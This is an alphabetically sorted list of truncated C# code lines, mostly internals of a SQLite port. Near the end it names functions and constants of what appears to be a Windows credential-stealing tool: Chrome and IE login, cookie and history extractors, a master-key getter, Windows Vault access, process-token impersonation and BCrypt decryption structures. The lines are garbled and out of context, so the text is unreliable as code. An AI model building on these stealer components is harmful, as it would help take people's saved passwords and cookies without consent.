        p = pParse.aColCache[idxLru]
        p = pSpace
        p = pcache1.pFree._PgHdr
        p = ppList
        p = sqlite3GlobalConfig.m.xMalloc( n )
        p = sqlite3GlobalConfig.m.xMalloc( nFull )
        p->pModule->xDisconnect(p)
        p.CacheAllocated = false
        p.CacheAllocated = true
        p.D = 1
        p.D = B - D - X1
        p.M = 1
        p.M = E < 14 
        p.Y = 2000
        p.Y = p.M > 2 
        p.aColName[n] = new Mem()
        p.aCol[i].zColl = zColl
        p.aLabel[i] = -1
        p.aLabel[j] = p.nOp
        p.aMem = new Mem[nMem 
        p.aMem[u] = new Mem()
        p.aOp[addr].p1 = val
        p.aOp[addr].p2 = val
        p.aOp[addr].p3 = val
        p.aOp[p.nOp - 1].p5 = val
        p.aOp[p.nOp - 1].zComment = pz
        p.aVar = new Mem[nVar == 0 
        p.aVar[i].flags = MEM_Null
        p.a[0].jointype = 0
        p.addrOpenEphm[2] = addrSortIndex =
        p.affChange = false
        p.apArg = new Mem[nArg == 0 
        p.apCsr = new VdbeCursor[nCursor == 0 
        p.apCsr[0] = new VdbeCursor()
        p.apCsr[iCur] = null
        p.apCsr[iCur] = pCx = new VdbeCursor()
        p.apHash = apNew
        p.azVar = new string[nArg == 0 
        p.azVar = new string[p.nOp]
        p.btreeMask 
        p.cacheStatus = CACHE_STALE
        p.cnt
        p.db = db
        p.deferredMoveto = false
        p.eState = CURSOR_FAULT
        p.eState == CURSOR_VALID)
        p.enc = SQLITE_UTF8
        p.endpoint.iOffset 
        p.expired = true
        p.flags 
        p.flags = (u16)( p.flags 
        p.flags = MEM_Null
        p.flags = UNPACKED_NEED_DESTROY
        p.iColumn = iCol
        p.iJD 
        p.iJD = (long)( sqlite3_value_double( argv[0] ) 
        p.iJD = (sqlite3_int64)( r 
        p.iLevel = pParse.iCacheLevel
        p.iLimit = iLimit = 
        p.iNext = 1
        p.iReg = iReg
        p.iRightJoinTable = (i16)iTable
        p.iSize = iSize
        p.iStatement = 0
        p.iSum 
        p.iTable = iTab
        p.inTrans = (wrflag != 0 
        p.inTrans = TRANS_NONE
        p.inTrans = TRANS_READ
        p.isAttached = 0
        p.lastRowid = p.movetoTarget
        p.lru = pParse.iCacheCnt
        p.n
        p.nBusy
        p.nBusy = -1
        p.nCursor = (u16)nCursor
        p.nFresh = ROWSET_ENTRY_PER_CHUNK
        p.nHash = nNew
        p.nLabelAlloc = p.aLabel.Length
        p.nMem = nMem
        p.nOp 
        p.nResColumn = (u16)( 8 - 5 
        p.nSet = 0
        p.nTab = 1
        p.nVar = (u16)nVar
        p.okVar = 0
        p.okVar = 1
        p.op = TK_ALL
        p.op = TK_INTEGER
        p.op == op 
        p.pBt = pBt
        p.pCache = pCache
        p.pChunk = pNew
        p.pDestDb = pDestDb
        p.pDirty = null
        p.pDirty = p.pDirtyNext
        p.pDirty = pPage.pDirtyNext
        p.pDirtyTail = pPage
        p.pDirtyTail = pPage.pDirtyPrev
        p.pEList = pNew
        p.pEntry = p.pEntry.pRight
        p.pEntry = pEntry
        p.pEntry = pEntry.pRight
        p.pFresh = pNew.aEntry
        p.pLeft = p.pRight = null
        p.pLeft = pLeft
        p.pLimit = null
        p.pLimit = pLimit
        p.pNext.pPrev = p.pPrev
        p.pOrderBy = null
        p.pOrderBy = pOrderBy
        p.pPgHdr = pPg
        p.pPrev.pNext = p.pNext
        p.pPrior = null
        p.pPrior = pNew
        p.pRight = pIn
        p.pRightmost = null
        p.pSrc = null
        p.pSrc = pSrc
        p.pSrc.nBackup
        p.pSrc.nBackup--
        p.pSrcDb = pSrcDb
        p.pSynced = pPage
        p.pSynced = pSynced
        p.pTree = null
        p.pc = 0
        p.rc = SQLITE_INTERRUPT
        p.rc = SQLITE_MISUSE
        p.rc = SQLITE_NOMEM
        p.rc = SQLITE_OK
        p.rc = rc
        p.rowidIsValid = ALWAYS( res == 0 ) 
        p.selFlags 
        p.selFlags = (u16)( p.selFlags 
        p.skipNext = errCode
        p.tempReg = 0
        p.tnum = db.init.newTnum
        p.tr_tm == tr_tm 
        p.trace = Console.Out
        p.type = SQLITE_NULL
        p.u.aBitmap[i / BITVEC_SZELEM] 
        p.u.aHash = new u32[aiValues.Length]
        p.u.iValue = pValue
        p.usesStmtJournal = false
        p.validHMS = 0
        p.validJD = 1
        p1 
        p1 -= p2
        p1--
        p2 = ( sqlite3_context_db_handle( context ) ).aLimit[SQLITE_LIMIT_LENGTH]
        p2 = len - p1
        p2 = sqlite3_value_int( argv[2] )
        p2--
        pAccum = pMem._StrAccum
        pAccum.mxAlloc = db.aLimit[SQLITE_LIMIT_LENGTH]
        pAccum.useMalloc = 1
        pAddr = cellOffset 
        pAggInfo = cf.pAggInfo == null 
        pAuxData.xDelete( ref pAuxData.pAux )
        pBest.iPrefEnc = enc
        pBest.nArg = (i16)nArg
        pBest.zName = zName
        pBt = new BtShared()
        pBt = null
        pBt = pPage.pBt
        pBt.autoVacuum = av != 0
        pBt.db = db
        pBt.inTransaction = TRANS_READ
        pBt.incrVacuum = av == 2
        pBt.pCursor = null
        pBt.pHasContent = sqlite3BitvecCreate((u32)nPage)
        pBt.pPage1 = null
        pBt.pSchema = new Schema()
        pBt.pSchema = null
        pBt.pTmpSpace = new byte[pBt.pageSize]
        pBt.pageSize = (u16)pageSize
        pBt.readOnly = sqlite3PagerIsreadonly(pBt.pPager)
        pBt.usableSize = (u16)(pBt.pageSize - nReserve)
        pBt.usableSize = (u16)usableSize
        pBt.xFreeSchema = xFree
        pBuf = (u32)( ( pBuf << 8 ) 
        pBuf.pNext = db.lookaside.pFree
        pBufOffset 
        pC = pAggInfo.aCol[i]
        pCache.apHash[h] = pPage
        pCache.bPurgeable = ( bPurgeable != 0 )
        pCache.iMaxKey = iKey
        pCache.iMaxKey = iLimit - 1
        pCache.iMaxKey = iNew
        pCache.nMax = (u32)nMax
        pCache.nPage
        pCache.nRecyclable
        pCache.nRef--
        pCache.pCache = null
        pCache.pCache = p
        pCache.pPage1 = null
        pCache.szPage = szPage
        pCell = pPage.aData
        pCellptr -= 2
        pChunk = p.readpoint.pChunk
        pChunk = pChunk.pNext
        pCol = ( p.aCol[p.nCol - 1] )
        pCol = aCol[i]
        pCol = p.aCol[i]
        pCol = pTable.aCol[i]
        pCol.affinity = sqlite3ExprAffinity( p )
        pCol.pDflt = null
        pCol.zColl = null
        pCol.zDflt = null
        pCol.zName = zName
        pCol.zType = null
        pColName = p.aColName[n]
        pColName.db = p.db
        pColName.flags = MEM_Null
        pColl = cf.pColl == null 
        pColl = new CollSeq[3]
        pColl = new CollSeq[enc]
        pColl = null
        pColl = pExpr.pColl
        pColl = pLeft.pColl
        pColl = pRight.pColl
        pColl.enc = (u8)( enc2 
        pColl.pUser = pCtx
        pColl.type = SQLITE_COLL_NOCASE
        pColl.xCmp = xCompare
        pColl.xDel = xDel
        pColl[enc - 1] = db.pDfltColl
        pCur = pCur.pNext
        pCur.aiIdx[pCur.iPage] = (u16)(pPage.nCell - 1)
        pCur.aiIdx[pCur.iPage] = (u16)lwr
        pCur.aiIdx[pCur.iPage] = pPage.nCell
        pCur.aiIdx[pCur.iPage]--
        pCur.apPage[pCur.iPage].nOverflow = 0
        pCur.eState = ((pRoot.nCell > 0) 
        pCur.eState = CURSOR_INVALID
        pCur.eState = CURSOR_REQUIRESEEK
        pCur.eState = CURSOR_VALID
        pCur.iPage = -1
        pCur.iPage = 0
        pCur.info.nSize = 0
        pCur.pKey = null
        pCur.pNext.pPrev = pCur
        pCur.skipNext = 0
        pCur.validNKey = false
        pCur.validNKey = true
        pCx.iDb = iDb
        pCx.nField = nField
        pData.rc = //db.mallocFailed != 0 
        pDatabase = null
        pDatabase = pTable
        pDb = db.aDb[iDb]
        pDb = db.aDb[i]
        pDb = db.aDb[p.iDb]
        pDb.pBt = null
        pDb.pSchema = null
        pDb.pSchema.cache_size = size
        pDb.pSchema.file_format = 1
        pDb.zName
        pDef = null
        pDef.flags = (byte)flagVal
        pDef.pHash = pHash.a[h]
        pDef.pNext = null
        pDef.pNext = pOther.pNext
        pDest.eDest == SRT_Except 
        pDest.iMem = pParse.nMem 
        pDest.nMem = nResultCol
        pDflt = null
        pDirty = null
        pDirtyTail = null
        pDone = sqlite3BitvecCreate( pSavepoint.nOrig )
        pDup.flags 
        pDup.flags2 
        pDup.iTable = pEList.a[iCol].iAlias
        pDup.pColl = pExpr.pColl
        pDup.u.zToken = zToken
        pE = pTerm.pExpr
        pE.iRightJoinTable = (i16)iRightJoinTable
        pEList = p.pEList
        pEList = pSelect.pEList
        pEnd = _pIter 
        pEntry = p.pEntry
        pEntry = pH.ht[h]
        pEntry.chain = pNew
        pEntry.count
        pEntry.count--
        pEntry.pRight = null
        pExpr = pExpr.pLeft
        pExpr = pTerm.pExpr
        pExpr.iTable = 
        pExpr.iTable = i = atoi( z.Substring( 1 ) )
        pExpr.iTable = iMem
        pExpr.iTable = r2
        pExpr.op = (u8)( ( ( pExpr.op - TK_GT ) 
        pExpr.op = TK_REGISTER
        pExpr.op = TK_STRING
        pExpr.pTab = null
        pF = pAggInfo.aFunc[i]
        pFKey = null
        pFKey.aCol[0].iFrom = p.nCol - 1
        pFile.fs.Close()
        pFile.lastErrno = (u32)Marshal.GetLastWin32Error()
        pFile.lastErrno = error
        pFrom = pTabList.a[i]
        pFrom.pIndex = pIdx
        pFunc = pAggInfo.aFunc[i]
        pFunc.xFinalize( ctx )
        pGroupBy = p.pGroupBy
        pH.first = elem.next
        pH.first = pNew
        pHasMoved = 0
        pHasMoved = 1
        pHash.a[h] = pDef
        pHead = null
        pHead = pEntry.count != 0 
        pHead.prev = pNew
        pId.pMethods = null
        pIdx != null 
        pIdx = pIdx.pNext
        pIdx = pLevel.plan.u.pIdx
        pIdx = pTabList.a[bestJ].pIndex
        pIdx.zColAff = pIdx_zColAff.ToString()
        pIdxKey = null
        pIdx_zColAff.Append( '
        pIdx_zColAff.Append( SQLITE_AFF_NONE )
        pIn = p.pDirty
        pIndex )
        pIndex = null
        pIndex.aSortOrder[i] = (u8)requestedSortOrder
        pIndex.aiColumn[i] = j
        pIndex.aiRowEst[i] = v
        pIndex.azColl[i] = zColl
        pIndex.zName
        pInfo = likeInfoAlt
        pInfo = likeInfoNorm
        pInfo = pParse.pAinc
        pInfo.aColl = new CollSeq[nExpr]
        pInfo.aSortOrder = new byte[nExpr]
        pInfo.db = db
        pInfo.enc = db.aDbStatic[0].pSchema.enc
        pInfo.iOverflow = (u16)(pInfo.nLocal 
        pInfo.iOverflow = 0
        pInfo.nData = 0
        pInfo.nData = nPayload
        pInfo.nField = (u16)nExpr
        pInfo.nKey = nPayload
        pInfo.nLocal = (u16)nPayload
        pInfo.nSize = (u16)(pInfo.iOverflow 
        pInfo.nSize = (u16)nSize
        pItem = pList.a[i]
        pItem = pList.a[pList.nExpr - 1]
        pItem = pNew.a[i] = new ExprList_item()
        pItem = pOrderBy.a[i]
        pItem.done = 0
        pItem.iAlias = pOldItem.iAlias
        pItem.iCol = 0
        pItem.iCol = pOldItem.iCol
        pItem.pExpr = pExpr
        pItem.sortOrder = pOldItem.sortOrder
        pItem.zName = pOldItem.zName
        pItem.zSpan = pOldItem.zSpan
        pKey = null
        pKey.aColl = new CollSeq[nCol]
        pKey.aSortOrder = new byte[nCol]
        pKey.db = pParse.db
        pKey.nField = (u16)nCol
        pKeyDup = new KeyInfo()
        pKeyInfo = new KeyInfo()
        pKeyInfo.aColl = new CollSeq[nCol]
        pKeyInfo.enc = db.aDbStatic[0].pSchema.enc
        pKeyInfo.nField = (u16)nCol
        pKeyMerge = new KeyInfo()
        pKeyMerge = null
        pLast.pRight = pEntry
        pLeft = cf.pLeft == null 
        pLeft = p
        pLeft = pExpr.x.pList.a[1].pExpr
        pLeft = pSrc.a[i]
        pLevel = pWInfo.a[i]
        pLevel.addrFirst = sqlite3VdbeCurrentAddr( v )
        pLevel.iFrom = (u8)bestJ
        pLevel.iLeftJoin = 
        pLevel.iTabCur = pTabItem.iCursor
        pLevel.op = (u8)( bRev != 0 
        pLevel.op = OP_Noop
        pLevel.p1 = iCur
        pLevel.p1 = iIdxCur
        pLevel.p2 = sqlite3VdbeCurrentAddr( v )
        pLevel.p2 = start
        pLevel.p5 = (u8)( ( pStart == null 
        pLevel.plan = bestPlan.plan
        pLevel.u._in.nIn
        pList = new ExprList()
        pList = new IdList()
        pList = new SrcList()
        pList = null
        pList = p.pRight
        pList = pList.pDirty
        pList = pParent.pEList
        pList.a = new SrcList_item[1]
        pList.a[0].sortOrder = (u8)sortOrder
        pList.a[pList.nExpr] = new ExprList_item()
        pList.nAlloc = 0
        pList.nAlloc = 1
        pList.nAlloc = pList.a.Length
        pListItem = pList.a[i]
        pMask = mask
        pMatch.colUsed 
        pMem = p.aMem[1]
        pMem = p.aMem[u]
        pMem = p.pResultSet[i_pMem
        pMem.db = pKeyInfo.db
        pMem.enc = 0
        pMem.enc = pKeyInfo.enc
        pMem.flags 
        pMem.flags = (u16)( pMem.flags 
        pMem.flags = 0
        pMem.flags = MEM_Blob 
        pMem.flags = MEM_Dyn 
        pMem.flags = MEM_Int
        pMem.flags = MEM_Null
        pMem.flags = MEM_Real
        pMem.flags = MEM_RowSet
        pMem.n = n
        pMem.r = r1
        pMem.r = val
        pMem.type = SQLITE_BLOB
        pMem.type = SQLITE_FLOAT
        pMem.type = SQLITE_INTEGER
        pMem.type = SQLITE_NULL
        pMem.type = SQLITE_TEXT
        pMem.u.i = pOp.p1
        pMem.u.i = pOp.p2
        pMem.xDel = null
        pMem.xDel = xDel
        pMem.xDel( ref pMem.z )
        pMem.z = null
        pMem.z = pMem.u.i.ToString()
        pMem.zBLOB = new byte[amt]
        pMem1.enc == SQLITE_UTF16LE 
        pMethods = null
        pNC.hasAgg = 1
        pNC.nDepth
        pNC.nDepth--
        pName = pName1
        pNew = new RowSetChunk()
        pNew = p.Copy_Minimal()
        pNew.aCol[i] = pCol
        pNew.a[i] = new IdList_item()
        pNew.a[i] = new SrcList_item()
        pNew.iAgg = -1
        pNew.nHeight = 1
        pNew.next = pH.first
        pNew.next = pHead
        pNew.op = (u8)op
        pNew.pNextChunk = p.pChunk
        pNew.prev = null
        pNew.prev = pHead.prev
        pNewItem.colUsed = pOldItem.colUsed
        pNewItem.iCursor = pOldItem.iCursor
        pNewItem.idx = pOldItem.idx
        pNewItem.isPopulated = pOldItem.isPopulated
        pNewItem.jointype = pOldItem.jointype
        pNewItem.notIndexed = pOldItem.notIndexed
        pNewItem.pIndex = pOldItem.pIndex
        pNewItem.zAlias = pOldItem.zAlias
        pNewItem.zDatabase = pOldItem.zDatabase
        pNewItem.zIndex = pOldItem.zIndex
        pNewItem.zName = pOldItem.zName
        pNewTable = SaveBuf[nested].pNewTable
        pNewTable = null
        pNewTrigger = SaveBuf[nested].pNewTrigger
        pNewTrigger = null
        pNext = (sqlite3_stmt)( (Vdbe)pStmt ).pNext
        pNext = (sqlite3_stmt)pDb.pVdbe
        pNext = pIndex.pNext
        pNextChunk = pChunk.pNextChunk
        pNextFKey = pFKey.pNextFrom
        pOldItem = p.a[i]
        pOp = p.aOp[i]
        pOp = p.aOp[pc]
        pOp.opcode = OP_Copy
        pOp.p4.ai = _p4.ai
        pOp.p4.i = _p4.i
        pOp.p4.p = _p4.p
        pOp.p4.p = null
        pOp.p4.pColl = _p4.pColl
        pOp.p4.pFunc = _p4.pFunc
        pOp.p4.pI64 = _p4.pI64
        pOp.p4.pKeyInfo = _p4.pKeyInfo
        pOp.p4.pKeyInfo = pKeyInfo
        pOp.p4.pMem = _p4.pMem
        pOp.p4.pReal = _p4.pReal
        pOp.p4.pVtab = _p4.pVtab
        pOp.p4.z = _p4.z
        pOp.p4type = P4_COLLSEQ
        pOp.p4type = P4_DYNAMIC
        pOp.p4type = P4_FUNCDEF
        pOp.p4type = P4_INT32
        pOp.p4type = P4_INTARRAY
        pOp.p4type = P4_KEYINFO
        pOp.p4type = P4_MEM
        pOp.p4type = P4_NOTUSED
        pOp.p4type = P4_VTAB
        pOp.p4type = n
        pOrTerm = pOrWc.a[i]
        pOrderBy.a[i].done = 0
        pOrderBy.iECursor = pParse.nTab
        pOrig.u.zToken = null
        pOrig.u.zToken = zToken
        pOther.pNext = pDef
        pOut = (Mem)nullMem
        pOut = pVm.pResultSet[i]
        pOut.flags 
        pOut.flags = (u16)( pOut.flags 
        pOutFlags = SQLITE_OPEN_READONLY
        pOutFlags = SQLITE_OPEN_READWRITE
        pOvfl = pPage.aOvfl[i]
        pOvflData = sqlite3PagerGetData(pOvflPage)
        pPKey2.flags = (ushort)( pPKey2.flags 
        pPKey2.rowid = mem1.u.i
        pPage = pCur.apPage[pCur.iPage]
        pPage = pMemPage
        pPage = pcache1.pLruTail
        pPage = pcache1AllocPage( pCache )
        pPage.aOvfl[j].idx = (u16)i
        pPage.aOvfl[j].pCell = pCell
        pPage.cellOffset = (cellOffset = (u16)(hdr 
        pPage.hasData = 0
        pPage.hasData = pPage.leaf
        pPage.iKey = iKey
        pPage.intKey = 0
        pPage.intKey = 1
        pPage.isInit = 0
        pPage.isInit = 1
        pPage.isInit = isInitOrig
        pPage.maskPage = (u16)(pBt.pageSize - 1)
        pPage.maxLocal = pBt.maxLeaf
        pPage.maxLocal = pBt.maxLocal
        pPage.minLocal = pBt.minLeaf
        pPage.minLocal = pBt.minLocal
        pPage.nCell
        pPage.nFree -= (u16)(2 
        pPage.nFree = (u16)(nFree - iCellFirst)
        pPage.nOverflow = 0
        pPage.nRef
        pPage.pCache = pCache
        pPage.pCache.nRecyclable--
        pPage.pDirtyNext.pDirtyPrev = pPage
        pPage.pDirtyNext.pDirtyPrev = pPage.pDirtyPrev
        pPage.pDirtyPrev.pDirtyNext = pPage.pDirtyNext
        pPage.pLruNext = null
        pPage.pLruPrev = null
        pPage.pNext = pCache.apHash[h]
        pPage.pPgHdr.pPgHdr1 = pPage
        pPageSize = (u16)pPager.pageSize
        pPager = sqlite3BtreePager( aNew.pBt )
        pPager.changeCountDone = false
        pPager.dbModified = true
        pPager.dbOrigSize = pPager.dbSize
        pPager.dbSize = pPg.pgno
        pPager.dbSizeValid = false
        pPager.doNotSync = false
        pPager.doNotSync = true
        pPager.errCode = SQLITE_OK
        pPager.errCode = rc
        pPager.exclusiveMode = eMode != 0
        pPager.journalHdr 
        pPager.journalHdr = -1
        pPager.journalHdr = 0
        pPager.journalMode = (u8)eMode
        pPager.journalMode = PAGER_JOURNALMODE_MEMORY
        pPager.journalMode = PAGER_JOURNALMODE_OFF
        pPager.journalMode == PAGER_JOURNALMODE_MEMORY )
        pPager.journalOff 
        pPager.journalOff = (int)szJ
        pPager.journalOff = 0
        pPager.journalOff = journalHdrOffset( pPager )
        pPager.journalOff = pSavepoint.iOffset
        pPager.journalSizeLimit = iLimit
        pPager.journalStarted = false
        pPager.journalStarted = true
        pPager.mxPgno = (Pgno)mxPage
        pPager.mxPgno = (Pgno)nPage
        pPager.nRec = 0
        pPager.nReserve = (i16)nReserve
        pPager.nSavepoint = nNew
        pPager.nSavepoint = nSavepoint
        pPager.nSubRec
        pPager.needSync = false
        pPager.needSync = true
        pPager.pInJournal = null
        pPager.sectorSize = (u32)sqlite3OsSectorSize( pPager.fd )
        pPager.sectorSize = 512
        pPager.sectorSize = MAX_SECTOR_SIZE
        pPager.sectorSize = iSectorSize
        pPager.setMaster = 0
        pPager.state = PAGER_EXCLUSIVE
        pPager.state = PAGER_SHARED
        pPager.state = PAGER_SYNCED
        pPager.state = PAGER_UNLOCK
        pPager.xReiniter( pPg )
        pPager.zFilename = zPathname.ToString()
        pPager.zJournal = pPager.zFilename 
        pParent.selFlags = (u16)( pParent.selFlags 
        pParse = new Parse()
        pParse->pNewTable 
        pParse->pNewTable->aCol = 0
        pParse->pNewTable->nCol = 0
        pParse.aTempReg[pParse.nTempReg
        pParse.checkSchema = 1
        pParse.ckBase = regData
        pParse.colNamesSet = 0
        pParse.iRangeReg 
        pParse.iRangeReg = iReg
        pParse.nErr
        pParse.nHeight 
        pParse.nHeight -= sqlite3SelectExprHeight( p )
        pParse.nMem
        pParse.nMem 
        pParse.nRangeReg -= nReg
        pParse.nRangeReg = nReg
        pParse.nTab
        pParse.nTab = baseCur 
        pParse.nTab = n
        pParse.pAinc = p.pNext
        pParse.pNewTable = null
        pParse.pVdbe = null
        pParse.pZombieTab = p.pNextZombie
        pParse.rc = SQLITE_DONE
        pParse.rc = SQLITE_ERROR
        pParse.rc = SQLITE_NOMEM
        pParse.rc = rc
        pParse.regRowid
        pParse.sLastToken.z = zSql.Substring( i )
        pParse.trigStack.orconf = orconf
        pParser.yyidx = -1
        pPayloadIndex 
        pPg != null 
        pPg = pPg.pDirtyPrev
        pPg.flags 
        pPg.pData = new u8[pPager.pageSize]
        pPg.pDirty = null
        pPgHdr.flags 
        pPgno = (u32)nPage 
        pProbe = null
        pProbe = pSrc.pIndex
        pRC = SQLITE_CORRUPT_BKPT()
        pRC = rc
        pRC = rc = sqlite3PagerWrite(pDbPage)
        pRec.flags = (u16)( pRec.flags 
        pReg = 0
        pReg = r1
        pRes = -1
        pRes = 0
        pRes = 1
        pRes = sqlite3Get4byte( ac )
        pResOut = File.Exists( zFilename ) 
        pRet = null
        pRight = cf.pRight == null 
        pRight = pExpr.x.pList.a[0].pExpr
        pRight = pParent.hdrOffset 
        pRight = pSrc.a[i 
        pRowSet.iBatch = iBatch
        pRowid = p.pEntry.v
        pS = pS.pPrior
        pSelect = pSelect.pNext
        pSelect = pSelect.pPrior
        pSelect.iLimit = 0
        pSelect.pPrior.pNext = pSelect
        pSize = 0
        pSize = pCur.info.nKey
        pSlot._PgHdr = p
        pSlot.pNext = pcache1.pFree
        pSrc = pData
        pSrc = pKey
        pSrc = pParent.pSrc
        pSrc.a[i 
        pSrc.a[iFrom].jointype = jointype
        pSrc.a[i] = new SrcList_item()
        pSrc.a[i].iCursor = -1
        pSrc.nAlloc = (i16)nAlloc
        pSrcIndex 
        pStep = pStep.pNext
        pStepList = pStepList.pNext
        pStepList.pTrig = pTrig
        pStmt = null
        pStop = _pCell 
        pSubSrc = pSub.pSrc
        pSubitem.pTab = null
        pSynced = null
        pTab = cf.pTab == null 
        pTab = null
        pTab = pNewItem.pTab = pOldItem.pTab
        pTab = pParse.pNewTable
        pTab = pTabItem.pTab
        pTab = pTabList->a[iSrc].pTab
        pTab->aCol = pParse->pNewTable->aCol
        pTab->nCol = pParse->pNewTable->nCol
        pTab.aCol[iCol].isPrimKey = 1
        pTab.iPKey = iCol
        pTab.keyConf = (byte)onError
        pTab.nRef
        pTab.tabFlags 
        pTab.zColAff = zColAff.ToString()
        pTabItem = pTabList.a[pLevel.iFrom]
        pTabList = p.pSrc
        pTable = pTemp
        pTable.nCol = -1
        pTable.pSchema.pSeqTab = pTable
        pTail.pDirty = null
        pTail.pDirty = pA
        pTail.pDirty = pB
        pTail.pRight = pA
        pTail.pRight = pB
        pTblName.a[0].zDatabase )
        pTerm = pOrderBy.a[j]
        pTerm = pWC.a[_pt]
        pTerm = pWC.a[idxTerm]
        pTerm = pWC.a[pWC.nTerm - j]
        pTerm = pWC.a[pWC.nTerm - k]
        pTerm.nChild = 2
        pTerm.prereqRight = 0
        pTerm.wtFlags 
        pTm = localtime( t )
        pTo.flags 
        pTo.flags = (u16)( pFrom.flags 
        pTo.isInit = 0
        pTo.pBt.pageSizeFixed = false
        pTopNC.nErr
        pTriggerStep = null
        pTriggerStep = pTriggerStep.pNext
        pTriggerStep.op = op
        pTriggerStep.orconf = OE_Default
        pTriggerStep.orconf = orconf
        pTriggerStep.pIdList = pColumn
        pTriggerStep.target.n = pName.n
        pTriggerStep.target.z = z
        pUnqual = pName1
        pUnqual = pName2
        pVal = sqlite3ValueNew( db )
        pValue = (int)p.u.iValue
        pVdbeFunc.apAux[nAux] = new AuxData()
        pVdbeFunc.nAux = iArg 
        pVdbeFunc.pFunc = pCtx.pFunc
        pVfs.pNext = vfsList
        pVfs.pNext = vfsList.pNext
        pWC.nSlot = pWC.a.Length - 1
        pWInfo.a[0].plan.wsFlags = (u32)( pWInfo.a[0].plan.wsFlags 
        pWInfo.a[i] = new WhereLevel()
        pWInfo.iContinue = pWInfo.a[i].addrCont
        pWInfo.okOnePass = 1
        pWalker.u.i = 0
        pWhere = null
        pX.iTable = iTab
        pZombieTab = SaveBuf[nested].pZombieTab
        pZombieTab = cf.pZombieTab
        pZombieTab = null
        p[0] = (byte)( ( v >> 7 ) 
        p[0] = (byte)v
        p[1] = (byte)( v 
        p[offset 
        p[offset] = (byte)( ( v >> 7 ) 
        p[offset] = (byte)v
        pagerReportSize( pPager )
        pagerUnlockAndRollback( pPager )
        pagerUnlockIfUnused( pPager )
        pager_reset( pPager )
        pager_unlock( pPager )
        pbMayReplace = seenReplace 
        pbRev = pOrderBy.a[0].sortOrder
        pc 
        pcache1.mutex = sqlite3_mutex_alloc( SQLITE_MUTEX_STATIC_LRU )
        pcache1.nMaxPage 
        pcache1.pEnd = pBuf
        pcache1.pFree = null
        pcache1.pFree = pSlot
        pcache1.pFree = pcache1.pFree.pNext
        pcache1.pStart = pBuf
        pcache1.szSlot = sz
        pcache1EnforceMaxPage()
        pcache1EnterMutex()
        pcache1Free( ref p.pPgHdr )
        pcache1FreePage( ref p )
        pcache1FreePage( ref pPage )
        pcache1LeaveMutex()
        pcache1PinPage( p )
        pcache1PinPage( pPage )
        pcache1RemoveFromHash( p )
        pcache1RemoveFromHash( pPage )
        pcacheAddToDirtyList( p )
        pcacheRemoveFromDirtyList( p )
        pg1 = (u32)( ( pPg.pgno - 1 ) 
        pgnoRoot
        pgnoRoot == PENDING_BYTE_PAGE(pBt))
        pik_flags 
        pik_flags = 0
        pik_flags = OPFLAG_NCHANGE
        pnAlloc = newSize
        pnChange 
        possible integer (ticket 
        pp = pp.pNext
        pp = sqlite3PagerBackupPtr( sqlite3BtreePager( p.pSrc ) )
        ppBtree = null
        ppChild = null
        ppFirst = pIn
        ppLast = pIn
        ppList = p.pRight
        ppOrderBy = null
        ppPage = null
        ppPage = pPage
        ppStmt = pParse.pVdbe
        ppVal = null
        prNow = ( (double)sqlite3_current_time.iValue 
        prereqAll 
        preserve = 0
        prior = totals[NDELAY - 1] 
        prior = totals[count]
        private const int ANYSIZE_ARRAY = 1
        private int MaxAuthTagSize(IntPtr hAlg)
        private sqlite db
        private static string GetProcessUserName(int pID)
        pseudoTab = pParse.nTab
        public ArrayList GetTables()
        public DataTable ExecuteQuery( String query )
        public ExprList pList
        public FuncDef pDef
        public Index pIdx
        public NameContext pNC
        public RowSet pRowSet
        public SQLiteDatabase( String DatabaseName )
        public SQLiteDatabase()
        public Select pSelect
        public WhereAndInfo pAndInfo
        public WhereOrInfo pOrInfo
        public WhereTerm pTerm
        public __in _in = new __in()
        public bool isInterrupted
        public byte[] Concat(params byte[][] arrays)
        public class __in               /
        public const uint BCRYPT_PAD_OAEP = 4
        public const uint BCRYPT_PAD_PSS = 8
        public const uint ERROR_SUCCESS = 0x00000000
        public double notUsed1
        public enum ProcessAccessFlags : uint
        public enum VAULT_ELEMENT_TYPE : Int32
        public enum VAULT_SCHEMA_ELEMENT_ID : Int32
        public extern static Int32 VaultCloseVault(ref IntPtr vaultHandle)
        public extern static Int32 VaultFree(ref IntPtr vaultHandle)
        public i64 i
        public int i
        public int iDb
        public int iFrom
        public int iValue
        public int leftColumn
        public int nZero
        public int newTnum
        public sqlite Connection()
        public sqlite3_index_info pVtabIdx
        public static bool Chrome_books()
        public static bool Chrome_cookies()
        public static bool Chrome_history()
        public static bool Chrome_logins()
        public static bool EnablePrivilege(string Privilege)
        public static bool IE_books()
        public static bool IE_history()//system 
        public static bool ImpersonateProcessToken(int pid)
        public static bool IsPrivilegeEnabled(string Privilege)
        public static byte[] GetMasterKey(string filePath)
        public static extern IntPtr OpenProcess(
        public static extern bool PrivilegeCheck(
        public static extern bool RevertToSelf()
        public static extern uint BCryptDestroyKey(IntPtr hKey)
        public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b)
        public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001
        public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001
        public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002
        public static uint SE_PRIVILEGE_ENABLED = 0x00000002
        public static uint STANDARD_RIGHTS_READ = 0x00020000
        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000
        public static uint TOKEN_ADJUST_DEFAULT = 0x00000080
        public static uint TOKEN_ADJUST_GROUPS = 0x00000040
        public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020
        public static uint TOKEN_ADJUST_SESSIONID = 0x00000100
        public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED 
        public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001
        public static uint TOKEN_DUPLICATE = 0x00000002
        public static uint TOKEN_IMPERSONATE = 0x00000004
        public static uint TOKEN_QUERY = 0x00000008
        public static uint TOKEN_QUERY_SOURCE = 0x00000010
        public static uint TOKEN_READ = STANDARD_RIGHTS_READ 
        public static void GetLogins()
        public string zCol
        public string zToken
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
        public struct BCRYPT_KEY_LENGTHS_STRUCT
        public struct BCRYPT_OAEP_PADDING_INFO
        public struct BCRYPT_PSS_PADDING_INFO
        public struct LUID
        public struct LUID_AND_ATTRIBUTES
        public struct PRIVILEGE_SET
        public struct TOKEN_PRIVILEGES
        public struct VAULT_ITEM_ELEMENT
        public struct VAULT_ITEM_WIN7
        public struct VAULT_ITEM_WIN8
        public u8 busy
